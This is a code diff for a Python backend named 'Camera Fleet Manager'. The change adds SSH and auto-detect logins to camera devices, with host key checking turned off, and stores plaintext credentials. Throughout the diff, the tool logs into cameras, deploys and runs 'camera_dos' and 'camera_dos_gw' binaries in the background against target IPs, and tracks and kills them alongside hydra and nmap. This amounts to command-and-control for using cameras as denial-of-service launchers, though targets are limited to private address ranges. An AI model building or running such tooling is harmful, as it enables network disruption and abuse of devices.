@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """Camera Fleet Manager — backend.
 
-Zero-dependency core (+ pexpect for telnet). Controls VNPT camera fleet:
+Zero-dependency core (+ pexpect for telnet/ssh). Controls VNPT camera fleet:
   - serves static frontend/ at /
   - REST API for scan, connect, deploy, exec, credentials
   - WebSocket /api/stream for real-time telemetry
@@ -47,7 +47,7 @@ NMAP = os.environ.get("CAMFLEET_NMAP", "nmap")
 WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
 START_TS = time.time()
 
-CRED_FIELDS = ["ip", "username", "password", "label", "group", "last_connected", "notes"]
+CRED_FIELDS = ["ip", "username", "password", "protocol", "label", "group", "last_connected", "notes"]
 
 os.makedirs(LOGDIR, exist_ok=True)
 os.makedirs(DATADIR, exist_ok=True)
@@ -301,11 +301,12 @@ def cred_save_batch(entries):
 
 
 # ------------------------------------------------------------ telnet pool
-class TelnetSession:
-    def __init__(self, ip, username, password):
+class DeviceSession:
+    def __init__(self, ip, username, password, protocol="telnet"):
         self.ip = ip
         self.username = username
         self.password = password
+        self.protocol = protocol
         self.child = None
         self.connected = False
         self.lock = threading.Lock()
@@ -315,42 +316,96 @@ class TelnetSession:
             raise RuntimeError("pexpect chưa cài — pip install pexpect")
         with self.lock:
             try:
-                self.child = pexpect.spawn(
-                    f"telnet {self.ip} 23", timeout=15, encoding="utf-8"
-                )
-                idx = self.child.expect(
-                    ["login:", "Login:", "Username:", "Connection refused",
-                     pexpect.TIMEOUT, pexpect.EOF],
-                    timeout=10
-                )
-                if idx >= 3:
-                    self.connected = False
-                    return False, "Không thể kết nối telnet"
-
-                self.child.sendline(self.username)
-                idx = self.child.expect(
-                    ["Password:", "password:", pexpect.TIMEOUT, pexpect.EOF],
-                    timeout=10
-                )
-                if idx >= 2:
-                    self.connected = False
-                    return False, "Không nhận được prompt mật khẩu"
-
-                self.child.sendline(self.password)
-                idx = self.child.expect(
-                    ["#", "\\$", "Login incorrect", "incorrect",
-                     pexpect.TIMEOUT, pexpect.EOF],
-                    timeout=10
-                )
-                if idx >= 2:
-                    self.connected = False
-                    return False, "Sai tài khoản/mật khẩu"
-
-                self.connected = True
-                return True, "OK"
+                if self.protocol == "auto":
+                    return self._connect_auto()
+                if self.protocol == "ssh":
+                    return self._connect_ssh()
+                return self._connect_telnet()
             except Exception as e:
                 self.connected = False
                 return False, str(e)
+
+    def _connect_auto(self):
+        ok, msg = self._connect_ssh()
+        if ok:
+            self.protocol = "ssh"
+            return True, "OK (auto→SSH)"
+        self.connected = False
+        self.child = None
+        ok, msg = self._connect_telnet()
+        if ok:
+            self.protocol = "telnet"
+            return True, "OK (auto→Telnet)"
+        return False, "Auto detect thất bại: SSH và Telnet đều không kết nối được"
+
+    def _connect_telnet(self):
+        self.child = pexpect.spawn(
+            f"telnet {self.ip} 23", timeout=15, encoding="utf-8"
+        )
+        idx = self.child.expect(
+            ["login:", "Login:", "Username:", "Connection refused",
+             pexpect.TIMEOUT, pexpect.EOF],
+            timeout=10
+        )
+        if idx >= 3:
+            self.connected = False
+            return False, "Không thể kết nối telnet"
+
+        self.child.sendline(self.username)
+        idx = self.child.expect(
+            ["Password:", "password:", pexpect.TIMEOUT, pexpect.EOF],
+            timeout=10
+        )
+        if idx >= 2:
+            self.connected = False
+            return False, "Không nhận được prompt mật khẩu"
+
+        self.child.sendline(self.password)
+        idx = self.child.expect(
+            ["#", "\\$", "Login incorrect", "incorrect",
+             pexpect.TIMEOUT, pexpect.EOF],
+            timeout=10
+        )
+        if idx >= 2:
+            self.connected = False
+            return False, "Sai tài khoản/mật khẩu"
+
+        self.connected = True
+        return True, "OK"
+
+    def _connect_ssh(self):
+        cmd = (f"ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa "
+               f"-o UserKnownHostsFile=/dev/null {self.username}@{self.ip}")
+        self.child = pexpect.spawn(cmd, timeout=15, encoding="utf-8")
+        idx = self.child.expect(
+            ["[Pp]assword:", "Are you sure", "Connection refused",
+             pexpect.TIMEOUT, pexpect.EOF],
+            timeout=10
+        )
+        if idx == 1:
+            self.child.sendline("yes")
+            idx = self.child.expect(
+                ["[Pp]assword:", pexpect.TIMEOUT, pexpect.EOF], timeout=10
+            )
+            if idx >= 1:
+                self.connected = False
+                return False, "Không thể kết nối SSH"
+        elif idx >= 2:
+            self.connected = False
+            return False, "Không thể kết nối SSH"
+
+        self.child.sendline(self.password)
+        idx = self.child.expect(
+            ["#", "\\$", "[Pp]ermission denied", "[Pp]assword:",
+             pexpect.TIMEOUT, pexpect.EOF],
+            timeout=10
+        )
+        if idx >= 2:
+            self.connected = False
+            return False, "Sai tài khoản/mật khẩu SSH"
+
+        self.connected = True
+        return True, "OK"
 
     def run_cmd(self, cmd, timeout=15):
         with self.lock:
@@ -384,13 +439,13 @@ class TelnetSession:
                 self.child = None
 
 
-class TelnetPool:
+class SessionPool:
     def __init__(self):
         self.sessions = {}
         self.lock = threading.Lock()
 
-    def connect(self, ip, username, password):
-        sess = TelnetSession(ip, username, password)
+    def connect(self, ip, username, password, protocol="telnet"):
+        sess = DeviceSession(ip, username, password, protocol=protocol)
         ok, msg = sess.connect()
         if ok:
             with self.lock:
@@ -425,7 +480,8 @@ class TelnetPool:
 
     def status(self):
         with self.lock:
-            return {ip: {"connected": s.connected, "username": s.username}
+            return {ip: {"connected": s.connected, "username": s.username,
+                         "protocol": s.protocol}
                     for ip, s in self.sessions.items()}
 
     def run_cmd(self, ip, cmd, timeout=15):
@@ -630,6 +686,7 @@ class Engine:
             ip = cam["ip"]
             user = cam.get("username", "root")
             pw = cam.get("password", "")
+            proto = cam.get("protocol", "telnet")
             if req_user:
                 locked, owner = device_lock(ip, req_user)
                 if not locked:
@@ -637,11 +694,16 @@ class Engine:
                     self._emit_log("connect", "error", f"✗ {ip} — {msg}")
                     results.append({"ip": ip, "ok": False, "msg": msg, "locked_by": owner})
                     return
-            self._emit_log("connect", "info", f"Đang kết nối {ip}…")
-            ok, msg = self.pool.connect(ip, user, pw)
+            proto_label = {"ssh": "SSH", "telnet": "Telnet"}.get(proto, "Auto Detect")
+            self._emit_log("connect", "info", f"Đang kết nối {ip} ({proto_label})…")
+            ok, msg = self.pool.connect(ip, user, pw, protocol=proto)
             if ok:
-                self._emit_log("connect", "ok", f"✓ {ip} — kết nối thành công")
+                sess = self.pool.get(ip)
+                actual_proto = sess.protocol if sess else proto
+                actual_label = "SSH" if actual_proto == "ssh" else "Telnet"
+                self._emit_log("connect", "ok", f"✓ {ip} — kết nối thành công ({actual_label})")
                 cred_save({"ip": ip, "username": user, "password": pw,
+                           "protocol": actual_proto,
                            "last_connected": time.strftime("%Y-%m-%d %H:%M:%S")})
             else:
                 self._emit_log("connect", "error", f"✗ {ip} — {msg}")
@@ -693,6 +755,14 @@ class Engine:
                     if p.isdigit() and int(p) > 100:
                         size = p
                         break
+            ok_gw, out_gw = self.pool.run_cmd(ip, "ls -la /tmp/camera_dos_gw 2>/dev/null")
+            gw_exists = ok_gw and "camera_dos_gw" in out_gw and "No such file" not in out_gw
+            gw_size = ""
+            if gw_exists:
+                for p in (out_gw or "").strip().split():
+                    if p.isdigit() and int(p) > 100:
+                        gw_size = p
+                        break
             ok2, out2 = self.pool.run_cmd(ip, "ls -la /tmp/camera-tools/cam-run 2>&1")
             tools_exists = ok2 and "cam-run" in out2 and "No such" not in (out2 or "")
             tools_size = ""
@@ -701,7 +771,11 @@ class Engine:
                     if p.isdigit() and int(p) > 100:
                         tools_size = p
                         break
-            results.append({"ip": ip, "exists": exists, "size": size,
+            sess = self.pool.get(ip)
+            dev_proto = sess.protocol if sess else "telnet"
+            results.append({"ip": ip, "protocol": dev_proto,
+                            "exists": exists, "size": size,
+                            "gw_exists": gw_exists, "gw_size": gw_size,
                             "tools_exists": tools_exists, "tools_size": tools_size,
                             "raw": output if ok else ""})
 
@@ -890,22 +964,25 @@ class Engine:
         if mode == "dos":
             if not valid_ipv4(target_ip) or not is_private_ipv4(target_ip):
                 return 403, {"error": f"Mục tiêu {target_ip} ngoài RFC1918"}
-            cmd = f"/tmp/camera_dos {target_ip} {args_str}".strip()
-            bg_cmd = f"killall camera_dos 2>/dev/null; rm -f /tmp/camdos.log; {timeout_prefix}{cmd} > /tmp/camdos.log 2>&1 &"
-            kill_name = "camera_dos"
-        else:
-            cmd = f"/tmp/camera-tools/cam-run --root /tmp/camera-tools {args_str}".strip()
-            bg_cmd = f"rm -f /tmp/camtools.log; {timeout_prefix}{cmd} > /tmp/camtools.log 2>&1 &"
-            kill_name = None
-
         results = []
-
+        last_cmd = [""]
         dur_label = f" (timeout {int(duration)}s)" if duration and int(duration) > 0 else ""
 
         def _exec_one(ip):
+            if mode == "dos":
+                sess = self.pool.get(ip)
+                is_gw = sess and sess.protocol == "ssh"
+                bin_name = "camera_dos_gw" if is_gw else "camera_dos"
+                cmd = f"/tmp/{bin_name} {target_ip} {args_str}".strip()
+                bg_cmd = f"killall {bin_name} 2>/dev/null; rm -f /tmp/camdos.log; {timeout_prefix}{cmd} > /tmp/camdos.log 2>&1 &"
+                logfile = "/tmp/camdos.log"
+            else:
+                cmd = f"/tmp/camera-tools/cam-run --root /tmp/camera-tools {args_str}".strip()
+                bg_cmd = f"rm -f /tmp/camtools.log; {timeout_prefix}{cmd} > /tmp/camtools.log 2>&1 &"
+                logfile = "/tmp/camtools.log"
+            last_cmd[0] = cmd
             self._emit_log("exec", "warn", f"[{ip}] $ {cmd}{dur_label}")
             ok, out = self.pool.run_cmd(ip, bg_cmd, timeout=10)
-            logfile = "/tmp/camdos.log" if mode == "dos" else "/tmp/camtools.log"
             self.pool.run_cmd(ip, f"sleep 2 && head -10 {logfile}", timeout=8)
             results.append({"ip": ip, "ok": ok, "msg": out[:500]})
 
@@ -917,7 +994,7 @@ class Engine:
         for t in threads:
             t.join(timeout=15)
 
-        self._emit_result("exec", {"results": results, "command": cmd})
+        self._emit_result("exec", {"results": results, "command": last_cmd[0]})
         if mode == "dos":
             self._start_exec_monitor(ips, duration=duration)
         else:
@@ -939,8 +1016,11 @@ class Engine:
             timeout_prefix = f"timeout {dur} " if dur > 0 else ""
 
             if mode == "dos":
-                cmd = f"/tmp/camera_dos {target_ip} {args}".strip()
-                bg_cmd = f"killall camera_dos 2>/dev/null; rm -f /tmp/camdos.log; {timeout_prefix}{cmd} > /tmp/camdos.log 2>&1 &"
+                sess = self.pool.get(ip)
+                is_gw = sess and sess.protocol == "ssh"
+                bin_name = "camera_dos_gw" if is_gw else "camera_dos"
+                cmd = f"/tmp/{bin_name} {target_ip} {args}".strip()
+                bg_cmd = f"killall {bin_name} 2>/dev/null; rm -f /tmp/camdos.log; {timeout_prefix}{cmd} > /tmp/camdos.log 2>&1 &"
             else:
                 cmd = f"/tmp/camera-tools/cam-run --root /tmp/camera-tools {args}".strip()
                 bg_cmd = f"rm -f /tmp/camtools.log; {timeout_prefix}{cmd} > /tmp/camtools.log 2>&1 &"
@@ -1002,7 +1082,7 @@ class Engine:
             elapsed = int(time.time() - self._exec_start_time)
             for ip in list(self._exec_monitor_ips):
                 try:
-                    pid_ok, pid_out = self.pool.run_cmd(ip, "pidof camera_dos >/dev/null 2>&1 && echo ALIVE || echo DEAD", timeout=3)
+                    pid_ok, pid_out = self.pool.run_cmd(ip, "(pidof camera_dos || pidof camera_dos_gw) >/dev/null 2>&1 && echo ALIVE || echo DEAD", timeout=3)
                     pid_alive = pid_ok and "ALIVE" in (pid_out or "")
 
                     ok, out = self.pool.run_cmd(ip, "tail -20 /tmp/camdos.log 2>/dev/null", timeout=5)
@@ -1128,8 +1208,8 @@ class Engine:
         self._exec_monitor_stop = True
         self._tools_monitor_stop = True
         for ip in ips:
-            self.pool.run_cmd(ip, "killall camera_dos cam-run fping nmap hydra 2>/dev/null", timeout=5)
-            self._emit_log("exec", "info", f"[{ip}] killall camera_dos cam-run fping nmap hydra")
+            self.pool.run_cmd(ip, "killall camera_dos camera_dos_gw cam-run fping nmap hydra 2>/dev/null", timeout=5)
+            self._emit_log("exec", "info", f"[{ip}] killall camera_dos camera_dos_gw cam-run fping nmap hydra")
         return 200, {"accepted": True}
 
     # -- snapshot ------------------------------------------------------
@@ -1188,7 +1268,7 @@ _user_state_lock = threading.Lock()
 def get_user_state(username):
     with _user_state_lock:
         if username not in _user_state:
-            pool = TelnetPool()
+            pool = SessionPool()
             hub = Hub()
             engine = Engine(pool, hub)
             _user_state[username] = {"engine": engine, "pool": pool, "hub": hub}
